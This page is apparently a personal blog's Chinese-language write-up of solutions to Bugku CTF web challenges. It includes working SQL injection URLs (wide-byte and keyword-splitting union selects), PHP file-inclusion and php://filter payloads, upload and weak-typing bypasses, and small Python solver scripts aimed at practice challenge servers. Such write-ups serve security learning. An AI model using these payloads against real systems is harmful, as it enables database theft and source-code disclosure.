@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.37.1" />
+
+  <title>Bugku ctf wp  &middot; BlankのBlog</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://blank233.github.io/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://blank233.github.io/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="https://blank233.github.io/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+ 
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="https://blank233.github.ioimg/clover.png" type="image/x-icon" />
+
+  
+  
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="https://blank233.github.io/">Menu</a>
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/topics/"><i class='fa fa-folder fa-fw'></i>Topics</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/tags/"><i class='fa fa-tags fa-fw'></i>Tags</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://weibo.com/6070994053" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/blank233" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; On the way.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Bugku ctf wp </h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>14 Mar 2018, 19:59</time>
+  </div>
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://blank233.github.iotopics/write_up">Write_up</a>
+    
+  </div>
+  
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://blank233.github.iotags/2018-03">2018-03</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <h1 id="bugku-ctf-wp-web">Bugku ctf wp &mdash;web</h1>
+
+<h3 id="ctf链接-http-ctf-bugku-com">ctf链接 <a href="http://ctf.bugku.com/">http://ctf.bugku.com/</a></h3>
+
+<p></p>
+
+<ul>
+<li>web2</li>
+</ul>
+
+<p>打开一片滑稽不停地向你飞来</p>
+
+<p>直接f12 查看源代码得到flag</p>
+
+<ul>
+<li>文件上传测试</li>
+</ul>
+
+<p>1、请上传PHP文件</p>
+
+<p>2、文件上传大小不允许超过1M</p>
+
+<p>上传php返回上传非图片文件，上传图片返回非PHP文件</p>
+
+<p>burp suite抓包发现只验证了 Content-Type: application/octet-stream字段，只要更改为image/png即可绕过，得到flag</p>
+
+<ul>
+<li>计算器</li>
+</ul>
+
+<p>输入答案发现只能输入一位数，f12更改maxlength值即可</p>
+
+<ul>
+<li>web基础$GET</li>
+</ul>
+
+<p>url后直接加?what=flag即可</p>
+
+<ul>
+<li>web基础$POST</li>
+</ul>
+
+<p>hack bar post一个what=flag即可</p>
+
+<ul>
+<li>矛盾</li>
+</ul>
+
+<p>php弱类型 变量num只要是1开头的字符串就可以 用get方式发送得到flag</p>
+
+<p>注：php弱类型不会可以点<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">这里</a></p>
+
+<ul>
+<li>web3</li>
+</ul>
+
+<p>打开后不停弹窗，禁止使用javascript后查看源代码发现</p>
+
+<pre><code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;
+</code></pre>
+
+<p>unioncode解码得到flag</p>
+
+<ul>
+<li>Sql注入</li>
+</ul>
+
+<p>这道题折腾了一段时间，后来还是看到wp才知道宽字节注入 还是做的少了啊 sqliabs有时间还是要去做做</p>
+
+<p>测试url：<a href="http://103.238.227.13:10083/?id=1%df%27">http://103.238.227.13:10083/?id=1%df%27</a> 报错</p>
+
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1運'' LIMIT 1' at line 1
+
+#order by 1/2成功，3失败
+http://103.238.227.13:10083/?id=1%df%27%20order%20by%203--+
+
+#爆数据库
+http://103.238.227.13:10083/?id=1%df%27%20%20union%20select%201,group_concat(schema_name)%20from%20information_schema.schemata--+
+
+#然后根据题目提示构造url得到flag
+http://103.238.227.13:10083/?id=1%df%27union%20select%201,string%20from%20sql5.key%20where%20id%20=1--+
+</code></pre>
+
+<p><a href="https://www.cnblogs.com/lcamry/articles/5625276.html">宽字节注入参考</a></p>
+
+<ul>
+<li>Sql注入1</li>
+</ul>
+
+<p>过滤了一些关键词，但是那一句过滤xss的语句可以帮助我们绕过</p>
+
+<p>只要在关键词里添加&lt;&gt;分隔即可  不在赘述 直接放payload</p>
+
+<pre><code>http://103.238.227.13:10087/?id=1 unio&lt;&gt;n selec&lt;&gt;t 1,hash fr&lt;&gt;om sql3.key wh&lt;&gt;ere id=1 --+
+</code></pre>
+
+<ul>
+<li>你必须让他停下来</li>
+</ul>
+
+<p>burp suite抓包  查看响应包发现每次返回的图片不一样</p>
+
+<p>任意构造一个数值放到intruder 多次访问 查看返回包的数据长度即可得到flag</p>
+
+<ul>
+<li>本地包含</li>
+</ul>
+
+<p>打开网址，提示是文件包含漏洞，通过file使其以数组形式返回</p>
+
+<p>然后利用var_dump输出 eval执行  构造url</p>
+
+<pre><code>http://120.24.86.145:8003/?hello=file(%22flag.php%22)
+</code></pre>
+
+<ul>
+<li>变量1</li>
+</ul>
+
+<p>跟i春秋上一道题相同 args=$GLOBALS即可</p>
+
+<ul>
+<li>web5</li>
+</ul>
+
+<p>查看源代码 把jsfuck代码放到控制台执行即可</p>
+
+<ul>
+<li>头等舱</li>
+</ul>
+
+<p>查看源代码  什么也没有</p>
+
+<p>burpsuite抓包  放到repeater里  响应头里既有flag</p>
+
+<ul>
+<li>web4</li>
+</ul>
+
+<p>查看源代码  url解码得到</p>
+
+<pre><code>var p1 = 'function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b';
+var p2 = 'aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;';
+eval(unescape(p1)   unescape('54aa2'   p2));
+#一段javascript代码  看wp后才知道是拼接字符串p1+54aa2+p2 发送即可
+</code></pre>
+
+<ul>
+<li>flag在index里面</li>
+</ul>
+
+<p>点击一下 chick me?no 跳转到</p>
+
+<pre><code>http://120.24.86.145:8005/post/index.php?file=show.php
+</code></pre>
+
+<p>看到传的参数是file=show.php file想到可能是文件包含 构造url</p>
+
+<pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+
+<p>可以得到base64编码的index.php内容  解码得到flag</p>
+
+<p>附上<a href="http://www.hackdig.com/?03/hack-1892.htm">php://filter在php漏洞中的利用</a></p>
+
+<ul>
+<li>输入密码查看flag</li>
+</ul>
+
+<p>burp suite爆破  查看返回包长度得到flag</p>
+
+<ul>
+<li>点击一百万次</li>
+</ul>
+
+<p>查看源代码</p>
+
+<pre><code>    var clicks=0
+    $(function() {
+      $(&quot;#cookie&quot;)
+        .mousedown(function() {
+          $(this).width('350px').height('350px');
+        })
+        .mouseup(function() {
+          $(this).width('375px').height('375px');
+          clicks++;
+          $(&quot;#clickcount&quot;).text(clicks);
+          if(clicks &gt;= 1000000){
+          	var form = $('&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;' +
+						'&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;' + clicks + '&quot; hidden/&gt;' +
+						'&lt;/form&gt;');
+						$('body').append(form);
+						form.submit();
+          }
+        });
+    });
+</code></pre>
+
+<p>用hackbar POST一个参数clicks 让它大于1000000就行了</p>
+
+<ul>
+<li>备份是个好习惯</li>
+</ul>
+
+<p>打开给了一串字符 不知道干嘛的  题目提示备份  url中添加index.php.bak得到index.php的源码</p>
+
+<pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);把查询字符串解析到变量中：
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+    echo $flag.&quot;取得flag&quot;;
+}
+?&gt;
+
+#代码解析
+
+$str = strstr($_SERVER['REQUEST_URI'], '?'); #获取url?之后的内容 包含?
+$str = substr($str,1); #从第一位开始截取$str后面的内容
+$str = str_replace('key','',$str); #把$str里面的'key'替换为''
+parse_str($str); #parse_str把查询字符串解析到变量中
+
+</code></pre>
+
+<p>附parse_str例子</p>
+
+<pre><code>&lt;?php
+parse_str(&quot;name=Bill&amp;age=60&quot;);
+echo $name.&quot;&lt;br&gt;&quot;;
+echo $age;
+?&gt;
+#输出为Bill和60
+</code></pre>
+
+<p>思路就是用get方式发送两个参数key1 和 key2 其中key1和key2的md5在 == 下比较相同 但值不同</p>
+
+<p>在这里用到了php的弱类型 只要key1 和 key2以0e开头即可得到flag</p>
+
+<p>附上一个网站：<a href="http://www.mamicode.com/info-detail-1719711.html">0e开头MD5值小结</a></p>
+
+<ul>
+<li>成绩单</li>
+</ul>
+
+<p>没啥可说的 判断出闭合方式就行
+附上payload</p>
+
+<pre><code>http://120.24.86.145:8002/chengjidan/index.php
+postdata:id=-1'union select 1,group_concat(skctf_flag),3,4 from skctf_flag.fl4g--+
+</code></pre>
+
+<ul>
+<li>秋名山司机</li>
+</ul>
+
+<p>一看就知道要用脚本  这尼玛自己算不存在的</p>
+
+<p>附上python脚本 一跑就出来了</p>
+
+<pre><code>import requests
+import re
+
+#由于每次给的数值不一样 所以要用session
+s = requests.Session()
+url = 'http://120.24.86.145:8002/qiumingshan/'
+r = s.get(url)
+
+rule = '&lt;div&gt;(.+?)\=\?;&lt;/div&gt;'
+res = re.findall(rule,r.content)
+
+#python eval函数是真的强
+data = {
+	&quot;value&quot;:eval(res[0])
+}
+
+r = s.post(url,data=data)
+print r.content
+</code></pre>
+
+<ul>
+<li>速度要快</li>
+</ul>
+
+<p>查看源代码</p>
+
+<pre><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;
+</code></pre>
+
+<p>f12 在相应头发现一个flag字段 值是一个base64加密的字符串 解码后给了flag 然而并不对</p>
+
+<p>还发现每次给的flag值不相同 试了试发现每次给的flag还能在用base64解码一次  尝试把二次解码的数据发送  得到flag</p>
+
+<p>附上脚本</p>
+
+<pre><code>import requests
+import base64
+
+s = requests.Session()
+url = 'http://120.24.86.145:8002/web6/'
+
+r = s.get(url)
+a = base64.b64decode(r.headers['flag'])
+print a 
+b = a.split(': ')[1]
+b = base64.b64decode(b)
+data = {
+	&quot;margin&quot;:b
+}
+r = s.post(url,data=data)
+print r.content
+</code></pre>
+
+<ul>
+<li>cookies欺骗</li>
+</ul>
+
+<p>打开后一段乱七八糟的字符串  解密也解不开</p>
+
+<p>然后发现urlfilename的值是一个base64加密的字符串  解密后得到keys.txt  访问keys.txt发现内容跟之前的是一样的 不过是截取了一部分</p>
+
+<p>尝试得到index.php的源代码 将index.php base64加密后访问  通过改变file值来读取内容  获取内容脚本如下</p>
+
+<pre><code>#获取index.php
+import requests
+
+a = 1
+f = open('index.php','w')
+while a &lt; 20:
+	url = 'http://120.24.86.145:8002/web11/index.php?line='+ str(a) +'&amp;filename=aW5kZXgucGhw'
+	a = a+1
+	r = requests.get(url)
+	f.write(r.content)
+
+f.close()
+</code></pre>
+
+<p>得到源代码</p>
+
+<pre><code>error_reporting(0);
+
+$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:&quot;&quot;);
+
+$line=isset($_GET['line'])?intval($_GET['line']):0;
+
+if($file=='') header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+
+$file_list = array(
+
+'0' =&gt;'keys.txt',
+
+'1' =&gt;'index.php',
+
+);
+
+ 
+if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){
+
+$file_list[2]='keys.php';
+
+}
+
+ 
+if(in_array($file, $file_list)){
+
+$fa = file($file);
+
+echo $fa[$line];
+
+}
+
+?&gt;
+
+</code></pre>
+
+<p>可以看到构造一个Cookie  字段和值均为margin  发送到keys.php即可得到flag</p>
+
+<p>注keys.php需要base64加密</p>
+
+<ul>
+<li>never give up</li>
+</ul>
+
+<p>查看源代码 得到一个tip 1p.html</p>
+
+<p>尝试访问但是却直接跳转到论坛主页  但是  但是  但是 在view-source:下查看源代码却没有跳转而是直接可以看到源代码</p>
+
+<pre><code>&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;
+&lt;!--
+
+
+var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; 
+function OutWord()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+} 
+OutWord();
+// --&gt;
+&lt;/SCRIPT&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</code></pre>
+
+<p>在源代码中 看到一个加密的超级长的字段  经过url-base64-url解密后得到一段php代码</p>
+
+<pre><code>if(!$_GET['id'])
+{
+	header('Location: hello.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.')) 
+{
+	echo 'no no no no no no no';	
+	return;
+}
+$data = @file_get_contents($a,'r');
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) 
+{
+	require(&quot;f4l2a3g.txt&quot;);
+}
+else
+{
+	print &quot;never never never give up !!!&quot;;
+}
+
+?&gt;
+</code></pre>
+
+<p><strong>id</strong>:id的值 == 0但是又不能为0 id=0a即可绕过
+<strong>a</strong>:$data==&ldquo;bugku is a nice plateform!&rdquo;  可以用令a=php://input  然后postbugku is a nice plateform!即可绕过.
+<strong>b</strong>:eregi函数遇到%00就会截断 所以令b=%00444444即可绕过</p>
+
+<p>最终payload如下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/1.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<hr />
+
+<h2 id="未完待续">未完待续 ~~</h2>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="https://blank233.github.io/post/create_hugo_website/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="https://blank233.github.io/post/create_hugo_website/">Create_Hugo_website</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+  </div>
+</div>
+
+
+
+  
+
+</div>
+
+</div>
+</div>
+<script src="https://blank233.github.iojs/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-103593285-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+</body>
+</html>
+
